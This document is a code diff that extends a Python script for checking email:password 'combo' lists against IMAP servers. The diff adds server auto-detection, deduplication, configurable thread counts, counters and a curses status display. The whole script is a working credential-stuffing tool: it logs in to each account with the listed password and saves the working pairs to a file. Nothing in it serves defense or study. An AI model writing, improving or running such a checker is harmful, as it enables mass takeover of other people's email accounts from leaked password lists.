@@ -1,69 +1,155 @@
 import imaplib
 import threading
 import queue
+import json
+import curses
+import time
 from raducord import Logger
+from collections import Counter
 
-def load_imap_settings(filename='prov.txt'):
-    imap_settings = {}
+def load_settings(filename, autodelete):
+    settings = {}
+    with open(filename, 'r', encoding='utf-8', errors='ignore' if autodelete else 'strict') as f:
+        lines = f.readlines()
+    valid_lines = []
+    for line in lines:
+        parts = line.strip().split(':')
+        if len(parts) == 3:
+            domain, server, port = parts
+            settings[domain] = (server, port)
+            valid_lines.append(line)
+    if autodelete:
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.writelines(valid_lines)
+    return settings
+
+def load_list(filename, autodelete):
+    items = []
+    with open(filename, 'r', encoding='utf-8', errors='ignore' if autodelete else 'strict') as f:
+        lines = f.readlines()
+    valid_lines = []
+    for line in lines:
+        items.append(line.strip())
+        valid_lines.append(line)
+    if autodelete:
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.writelines(valid_lines)
+    return items
+
+def remove_duplicates(combos):
+    combo_count = Counter(combos)
+    duplicates = len(combos) - len(combo_count)
+    unique_combos = list(combo_count.keys())
+    return unique_combos, duplicates
+
+def load_config(filename='config.json'):
     with open(filename, 'r') as f:
-        for line in f:
-            parts = line.strip().split(':')
-            if len(parts) == 3:
-                domain, server, port = parts
-                imap_settings[domain] = (server, port)
-    return imap_settings
+        return json.load(f)
 
-def load_combos(filename='combo.txt'):
-    with open(filename, 'r') as f:
-        combos = [line.strip() for line in f if ':' in line]
-    return combos
+def save_settings(settings, filename):
+    with open(filename, 'w') as f:
+        for domain, (server, port) in settings.items():
+            f.write(f"{domain}:{server}:{port}\n")
 
-def load_proxies(filename='proxies.txt'):
-    with open(filename, 'r') as f:
-        proxies = [line.strip() for line in f]
-    return proxies
+def auto_detect_server(domain, retries, retry_delay):
+    server = f'imap.{domain}'
+    port = 993
+    for _ in range(retries):
+        try:
+            mail = imaplib.IMAP4_SSL(server, port)
+            return server, port
+        except:
+            time.sleep(retry_delay)
+    return None, None
 
-def check_email(combo, imap_settings):
+def check_email(combo, settings, valid_count, invalid_count, error_count, lock, config):
     email, password = combo.split(':')
     domain = email.split('@')[-1]
-    if domain not in imap_settings:
-        Logger.failed(f"{email},{password},INVALID")
-        return
     
-    server, port = imap_settings[domain]
+    if domain not in settings:
+        server, port = auto_detect_server(domain, config['retries'], config['retry_delay'])
+        if server and port:
+            settings[domain] = (server, port)
+            save_settings(settings, config['imap_file'])
+        else:
+            Logger.failed(f"{email},{password},INVALID")
+            with lock:
+                invalid_count[0] += 1
+            return
+    
+    server, port = settings[domain]
     try:
         mail = imaplib.IMAP4_SSL(server, port)
         mail.login(email, password)
         Logger.success(f"{email},{password},VALID")
-        with open('validmail.txt', 'a') as f:
+        with open(config['valid_file'], 'a') as f:
             f.write(f"{email}:{password}\n")
+        with lock:
+            valid_count[0] += 1
     except:
         Logger.failed(f"{email},{password},INVALID")
+        with lock:
+            invalid_count[0] += 1
 
-def worker(imap_settings, combos):
+def worker(settings, combos, valid_count, invalid_count, error_count, lock, config):
     while not combos.empty():
         combo = combos.get()
-        check_email(combo, imap_settings)
-        combos.task_done()
+        try:
+            check_email(combo, settings, valid_count, invalid_count, error_count, lock, config)
+        except Exception as e:
+            Logger.warning(f"Error processing, combo, {combo}: {e}")
+            with lock:
+                error_count[0] += 1
+        finally:
+            combos.task_done()
+
+def display_cui(stdscr, valid_count, invalid_count, error_count):
+    curses.curs_set(0)
+    curses.start_color()
+    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
+    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
+    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
+    while True:
+        stdscr.clear()
+        stdscr.addstr(0, 0, f"[Valid : {valid_count[0]}]", curses.color_pair(1))
+        stdscr.addstr(1, 0, f"[Invalid : {invalid_count[0]}]", curses.color_pair(2))
+        stdscr.addstr(2, 0, f"[Errors : {error_count[0]}]", curses.color_pair(3))
+        stdscr.refresh()
+        curses.napms(500)
 
 def main():
-    imap_settings = load_imap_settings()
-    combos = load_combos()
-    proxies = load_proxies()
-
+    config = load_config()
+    
+    settings = load_settings(config['imap_file'], config['autodelete'])
+    combos = load_list(config['combo_file'], config['autodelete'])
+    
+    unique_combos, duplicates = remove_duplicates(combos)
     combo_queue = queue.Queue()
-
-    for combo in combos:
+    for combo in unique_combos:
         combo_queue.put(combo)
+    
+    print(f"Removed {duplicates} duplicates. Starting in 5 seconds...")
+    time.sleep(5)
+
+    valid_count = [0]
+    invalid_count = [0]
+    error_count = [0]
+    lock = threading.Lock()
 
     threads = []
-    for _ in range(100):
-        thread = threading.Thread(target=worker, args=(imap_settings, combo_queue))
+    for _ in range(config['threads']):
+        thread = threading.Thread(target=worker, args=(settings, combo_queue, valid_count, invalid_count, error_count, lock, config))
         thread.start()
         threads.append(thread)
 
-    for thread in threads:
-        thread.join()
+    if config['cui']:
+        curses.wrapper(display_cui, valid_count, invalid_count, error_count)
+    else:
+        for thread in threads:
+            thread.join()
+
+    if config['summary']:
+        print(f"\nSummary Report:\nValid: {valid_count[0]}\nInvalid: {invalid_count[0]}\nErrors: {error_count[0]}")
 
 if __name__ == '__main__':
     main()
